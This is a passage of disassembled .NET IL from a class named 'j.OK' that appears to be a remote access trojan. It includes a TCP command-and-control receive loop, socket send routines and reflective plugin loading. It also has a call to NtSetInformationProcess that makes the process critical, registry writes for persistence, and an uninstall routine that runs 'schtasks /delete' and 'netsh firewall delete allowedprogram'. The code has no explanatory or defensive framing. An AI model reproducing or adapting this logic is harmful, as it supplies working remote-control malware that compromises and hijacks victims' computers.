    IL_0034:  ldarg.1
    IL_0035:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003a:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_003f:  brfalse.s  IL_0056

    IL_0041:  ldloc.1
    IL_0042:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_0047:  ldloc.s    V_4
    IL_0049:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_004e:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0053:  stloc.0
    IL_0054:  br.s       IL_0070

    IL_0056:  ldloc.s    V_6
    IL_0058:  ldc.i4.1
    IL_0059:  add.ovf
    IL_005a:  stloc.s    V_6
    IL_005c:  ldloc.s    V_6
    IL_005e:  ldloc.s    V_5
    IL_0060:  ldlen
    IL_0061:  conv.i4
    IL_0062:  blt.s      IL_0021

    IL_0064:  ldloc.3
    IL_0065:  ldc.i4.1
    IL_0066:  add.ovf
    IL_0067:  stloc.3
    IL_0068:  ldloc.3
    IL_0069:  ldloc.2
    IL_006a:  ldlen
    IL_006b:  conv.i4
    IL_006c:  blt.s      IL_0010

    IL_006e:  ldnull
    IL_006f:  stloc.0
    IL_0070:  ldloc.0
    IL_0071:  ret
  } // end of method OK::Plugin

  .method public static void  pr(int32 i) cil managed
  {
    // Code size       49 (0x31)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0005:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000a:  ldc.i4.s   29
      IL_000c:  ldarga.s   i
      IL_000e:  ldc.i4.4
      IL_000f:  call       int32 j.OK::NtSetInformationProcess(native int,
                                                               int32,
                                                               int32&,
                                                               int32)
      IL_0014:  pop
      IL_0015:  leave.s    IL_0030

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0017:  dup
      IL_0018:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001d:  stloc.0
      IL_001e:  ldloc.0
      IL_001f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0024:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0029:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002e:  leave.s    IL_0030

    }  // end handler
    IL_0030:  ret
  } // end of method OK::pr

  .method public static void  RC() cil managed
  {
    // Code size       565 (0x235)
    .maxstack  8
    .locals init (int64 V_0,
             int32 V_1,
             int64 V_2,
             int32 V_3,
             string V_4,
             int32 V_5,
             char V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8)
    IL_0000:  ldstr      ""
    IL_0005:  stsfld     string j.OK::lastcap
    IL_000a:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_000f:  brfalse    IL_01d2

    IL_0014:  ldc.i4.m1
    IL_0015:  conv.i8
    IL_0016:  stloc.0
    IL_0017:  ldc.i4.0
    IL_0018:  stloc.1
    .try
    {
      IL_0019:  ldloc.1
      IL_001a:  ldc.i4.1
      IL_001b:  add.ovf
      IL_001c:  stloc.1
      IL_001d:  ldloc.1
      IL_001e:  ldc.i4.s   10
      IL_0020:  bne.un.s   IL_002a

      IL_0022:  ldc.i4.0
      IL_0023:  stloc.1
      IL_0024:  ldc.i4.1
      IL_0025:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_002a:  ldsfld     bool j.OK::Cn
      IL_002f:  brtrue.s   IL_0036

      IL_0031:  leave      IL_01d2

      IL_0036:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_003b:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0040:  ldc.i4.1
      IL_0041:  bge.s      IL_0055

      IL_0043:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0048:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_004d:  ldc.i4.m1
      IL_004e:  ldc.i4.0
      IL_004f:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_0054:  pop
      IL_0055:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_005a:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_005f:  ldc.i4.0
      IL_0060:  ble        IL_01b5

      IL_0065:  ldloc.0
      IL_0066:  ldc.i4.m1
      IL_0067:  conv.i8
      IL_0068:  bne.un.s   IL_00e9

      IL_006a:  ldstr      ""
      IL_006f:  stloc.s    V_4
      IL_0071:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0076:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_007b:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_0080:  stloc.s    V_5
      IL_0082:  ldloc.s    V_5
      IL_0084:  ldc.i4.m1
      IL_0085:  beq.s      IL_008d

      IL_0087:  ldloc.s    V_5
      IL_0089:  brfalse.s  IL_0092

      IL_008b:  br.s       IL_00c4

      IL_008d:  leave      IL_01d2

      IL_0092:  ldloc.s    V_4
      IL_0094:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_0099:  stloc.0
      IL_009a:  ldstr      ""
      IL_009f:  stloc.s    V_4
      IL_00a1:  ldloc.0
      IL_00a2:  brtrue.s   IL_00b2

      IL_00a4:  ldstr      ""
      IL_00a9:  call       bool j.OK::Send(string)
      IL_00ae:  pop
      IL_00af:  ldc.i4.m1
      IL_00b0:  conv.i8
      IL_00b1:  stloc.0
      IL_00b2:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00b7:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00bc:  ldc.i4.0
      IL_00bd:  bgt.s      IL_0055

      IL_00bf:  br         IL_0019

      IL_00c4:  ldloc.s    V_4
      IL_00c6:  ldloc.s    V_5
      IL_00c8:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_00cd:  stloc.s    V_6
      IL_00cf:  ldloca.s   V_6
      IL_00d1:  call       instance string [mscorlib]System.Char::ToString()
      IL_00d6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00db:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_00e0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00e5:  stloc.s    V_4
      IL_00e7:  br.s       IL_0071

      IL_00e9:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00ee:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00f3:  ldc.i4.1
      IL_00f4:  add.ovf
      IL_00f5:  ldc.i4.1
      IL_00f6:  sub.ovf
      IL_00f7:  ldc.i4.1
      IL_00f8:  add.ovf
      IL_00f9:  newarr     [mscorlib]System.Byte
      IL_00fe:  stsfld     uint8[] j.OK::b
      IL_0103:  ldloc.0
      IL_0104:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0109:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_010e:  sub.ovf
      IL_010f:  stloc.2
      IL_0110:  ldsfld     uint8[] j.OK::b
      IL_0115:  ldlen
      IL_0116:  conv.i4
      IL_0117:  conv.i8
      IL_0118:  ldloc.2
      IL_0119:  ble.s      IL_0130

      IL_011b:  ldloc.2
      IL_011c:  ldc.i4.1
      IL_011d:  conv.i8
      IL_011e:  sub.ovf
      IL_011f:  conv.ovf.i4
      IL_0120:  ldc.i4.1
      IL_0121:  add.ovf
      IL_0122:  ldc.i4.1
      IL_0123:  sub.ovf
      IL_0124:  ldc.i4.1
      IL_0125:  add.ovf
      IL_0126:  newarr     [mscorlib]System.Byte
      IL_012b:  stsfld     uint8[] j.OK::b
      IL_0130:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0135:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_013a:  ldsfld     uint8[] j.OK::b
      IL_013f:  ldc.i4.0
      IL_0140:  ldsfld     uint8[] j.OK::b
      IL_0145:  ldlen
      IL_0146:  conv.i4
      IL_0147:  ldc.i4.0
      IL_0148:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_014d:  stloc.3
      IL_014e:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0153:  ldsfld     uint8[] j.OK::b
      IL_0158:  ldc.i4.0
      IL_0159:  ldloc.3
      IL_015a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_015f:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0164:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0169:  ldloc.0
      IL_016a:  bne.un     IL_0019

      IL_016f:  ldc.i4.m1
      IL_0170:  conv.i8
      IL_0171:  stloc.0
      IL_0172:  ldnull
      IL_0173:  ldftn      void j.OK::_Lambda__1(object)
      IL_0179:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_017e:  ldc.i4.1
      IL_017f:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_0184:  dup
      IL_0185:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_018a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_018f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_0194:  ldc.i4.s   100
      IL_0196:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_019b:  pop
      IL_019c:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01a1:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_01a6:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_01ab:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01b0:  br         IL_0019

      IL_01b5:  leave.s    IL_01d2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01b7:  dup
      IL_01b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01bd:  stloc.s    V_7
      IL_01bf:  ldloc.s    V_7
      IL_01c1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01c6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d0:  leave.s    IL_01d2

    }  // end handler
    IL_01d2:  nop
    .try
    {
      IL_01d3:  ldsfld     object j.OK::PLG
      IL_01d8:  brfalse.s  IL_0200

      IL_01da:  ldsfld     object j.OK::PLG
      IL_01df:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01e4:  ldnull
      IL_01e5:  ldstr      "clear"
      IL_01ea:  ldc.i4.0
      IL_01eb:  newarr     [mscorlib]System.Object
      IL_01f0:  ldnull
      IL_01f1:  ldnull
      IL_01f2:  ldnull
      IL_01f3:  ldc.i4.1
      IL_01f4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_01f9:  pop
      IL_01fa:  ldnull
      IL_01fb:  stsfld     object j.OK::PLG
      IL_0200:  leave.s    IL_021d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0202:  dup
      IL_0203:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0208:  stloc.s    V_8
      IL_020a:  ldloc.s    V_8
      IL_020c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0211:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0216:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_021b:  leave.s    IL_021d

    }  // end handler
    IL_021d:  ldc.i4.0
    IL_021e:  stsfld     bool j.OK::Cn
    IL_0223:  call       bool j.OK::connect()
    IL_0228:  brfalse.s  IL_01d2

    IL_022a:  ldc.i4.1
    IL_022b:  stsfld     bool j.OK::Cn
    IL_0230:  br         IL_0000
  } // end of method OK::RC

  .method public static uint8[]  SB(string& S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000c:  ret
  } // end of method OK::SB

  .method public static bool  Send(string S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarga.s   S
    IL_0002:  call       uint8[] j.OK::SB(string&)
    IL_0007:  call       bool j.OK::Sendb(uint8[])
    IL_000c:  ret
  } // end of method OK::Send

  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // Code size       232 (0xe8)
    .maxstack  5
    .locals init (bool V_0,
             object V_1,
             class [mscorlib]System.IO.MemoryStream V_2,
             int32 V_3,
             uint8[] V_4,
             string V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7)
    IL_0000:  ldsfld     bool j.OK::Cn
    IL_0005:  brtrue.s   IL_000e

    IL_0007:  ldc.i4.0
    IL_0008:  stloc.0
    IL_0009:  br         IL_00e6

    IL_000e:  nop
    .try
    {
      IL_000f:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0014:  stloc.1
      IL_0015:  ldloc.1
      IL_0016:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_001b:  ldsfld     bool j.OK::Cn
        IL_0020:  brtrue.s   IL_0029

        IL_0022:  ldc.i4.0
        IL_0023:  stloc.0
        IL_0024:  leave      IL_00e6

        IL_0029:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_002e:  stloc.2
        IL_002f:  ldarg.0
        IL_0030:  ldlen
        IL_0031:  conv.i4
        IL_0032:  stloc.3
        IL_0033:  ldloca.s   V_3
        IL_0035:  call       instance string [mscorlib]System.Int32::ToString()
        IL_003a:  ldstr      bytearray (00 00 ) 
        IL_003f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0044:  stloc.s    V_5
        IL_0046:  ldloca.s   V_5
        IL_0048:  call       uint8[] j.OK::SB(string&)
        IL_004d:  stloc.s    V_4
        IL_004f:  ldloc.2
        IL_0050:  ldloc.s    V_4
        IL_0052:  ldc.i4.0
        IL_0053:  ldloc.s    V_4
        IL_0055:  ldlen
        IL_0056:  conv.i4
        IL_0057:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_005c:  ldloc.2
        IL_005d:  ldarg.0
        IL_005e:  ldc.i4.0
        IL_005f:  ldarg.0
        IL_0060:  ldlen
        IL_0061:  conv.i4
        IL_0062:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0067:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_006c:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0071:  ldloc.2
        IL_0072:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0077:  ldc.i4.0
        IL_0078:  ldloc.2
        IL_0079:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_007e:  conv.ovf.i4
        IL_007f:  ldc.i4.0
        IL_0080:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_0085:  pop
        IL_0086:  leave.s    IL_008f

      }  // end .try
      finally
      {
        IL_0088:  ldloc.1
        IL_0089:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_008e:  endfinally
      }  // end handler
      IL_008f:  leave.s    IL_00e0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0091:  dup
      IL_0092:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0097:  stloc.s    V_6
      IL_0099:  ldloc.s    V_6
      IL_009b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      .try
      {
        IL_00a0:  ldsfld     bool j.OK::Cn
        IL_00a5:  brfalse.s  IL_00b7

        IL_00a7:  ldc.i4.0
        IL_00a8:  stsfld     bool j.OK::Cn
        IL_00ad:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00b2:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00b7:  leave.s    IL_00d4

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00b9:  dup
        IL_00ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00bf:  stloc.s    V_7
        IL_00c1:  ldloc.s    V_7
        IL_00c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00c8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00d2:  leave.s    IL_00d4

      }  // end handler
      IL_00d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00de:  leave.s    IL_00e0

    }  // end handler
    IL_00e0:  ldsfld     bool j.OK::Cn
    IL_00e5:  stloc.0
    IL_00e6:  ldloc.0
    IL_00e7:  ret
  } // end of method OK::Sendb

  .method public static bool  STV(string n,
                                  object t,
                                  valuetype [mscorlib]Microsoft.Win32.RegistryValueKind typ) cil managed
  {
    // Code size       86 (0x56)
    .maxstack  4
    .locals init (bool V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002f:  ldarg.2
      IL_0030:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object,
                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0035:  ldc.i4.1
      IL_0036:  stloc.0
      IL_0037:  leave.s    IL_0054

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0039:  dup
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003f:  stloc.1
      IL_0040:  ldloc.1
      IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0046:  ldc.i4.0
      IL_0047:  stloc.0
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0052:  leave.s    IL_0054

    }  // end handler
    IL_0054:  ldloc.0
    IL_0055:  ret
  } // end of method OK::STV

  .method public static void  UNS() cil managed noinlining nooptimization
  {
    // Code size       491 (0x1eb)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6)
    IL_0000:  ldc.i4.0
    IL_0001:  call       void j.OK::pr(int32)
    IL_0006:  ldc.i4.0
    IL_0007:  stsfld     bool j.OK::Isu
    .try
    {
      IL_000c:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0011:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0016:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_001b:  ldsfld     string j.OK::sf
      IL_0020:  ldc.i4.1
      IL_0021:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0026:  ldsfld     string j.OK::RG
      IL_002b:  ldc.i4.0
      IL_002c:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0031:  leave.s    IL_004c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0033:  dup
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0039:  stloc.0
      IL_003a:  ldloc.0
      IL_003b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0040:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0045:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004a:  leave.s    IL_004c

    }  // end handler
    IL_004c:  nop
    .try
    {
      IL_004d:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0052:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0057:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_005c:  ldsfld     string j.OK::sf
      IL_0061:  ldc.i4.1
      IL_0062:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0067:  ldsfld     string j.OK::RG
      IL_006c:  ldc.i4.0
      IL_006d:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0072:  leave.s    IL_008d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0074:  dup
      IL_0075:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_007a:  stloc.1
      IL_007b:  ldloc.1
      IL_007c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0081:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0086:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_008b:  leave.s    IL_008d

    }  // end handler
    IL_008d:  ldsfld     bool j.OK::Sched
    IL_0092:  brfalse.s  IL_00d0

    .try
    {
      IL_0094:  ldstr      "schtasks /delete /tn \""
      IL_0099:  ldsfld     string j.OK::SCHEDNAME
      IL_009e:  ldstr      "\" /f"
      IL_00a3:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00a8:  ldc.i4.0
      IL_00a9:  ldc.i4.1
      IL_00aa:  ldc.i4     0x1388
      IL_00af:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_00b4:  pop
      IL_00b5:  leave.s    IL_00d0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b7:  dup
      IL_00b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00bd:  stloc.2
      IL_00be:  ldloc.2
      IL_00bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ce:  leave.s    IL_00d0

    }  // end handler
    IL_00d0:  ldsfld     bool j.OK::DFire
    IL_00d5:  brfalse.s  IL_0114

    .try
    {
      IL_00d7:  ldstr      "netsh firewall delete allowedprogram \""
      IL_00dc:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_00e1:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_00e6:  ldstr      "\""
      IL_00eb:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00f0:  ldc.i4.0
      IL_00f1:  ldc.i4.0
      IL_00f2:  ldc.i4.m1
      IL_00f3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_00f8:  pop
      IL_00f9:  leave.s    IL_0114

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00fb:  dup
      IL_00fc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0101:  stloc.3
      IL_0102:  ldloc.3
      IL_0103:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0108:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_010d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0112:  leave.s    IL_0114

    }  // end handler
    IL_0114:  nop
    .try
    {
      IL_0115:  ldsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_011a:  brfalse.s  IL_0145

      IL_011c:  ldsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_0121:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0126:  ldc.i4.7
      IL_0127:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_012c:  ldstr      "\\"
      IL_0131:  ldsfld     string j.OK::RG
